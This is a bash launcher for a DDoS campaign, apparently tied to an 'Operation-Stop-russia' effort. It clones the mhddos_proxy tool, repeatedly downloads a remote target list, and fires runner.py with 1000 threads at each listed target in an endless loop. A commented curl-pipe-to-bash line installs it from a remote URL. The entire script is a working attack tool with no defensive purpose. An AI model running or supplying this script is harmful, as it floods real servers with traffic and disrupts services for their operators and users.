#!/bin/bash
#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m-proxy_only.sh | bash
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt

threads="${1:-1000}"; threads="-t $threads"
rpc="--vpn"
debug="--debug"

while true
do
   pkill -f runner.py
   sleep 10
   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
   while [[ $list_size = "0"  ]]
      do
            sleep 5
            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
      done
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
      done
sleep 9m
done
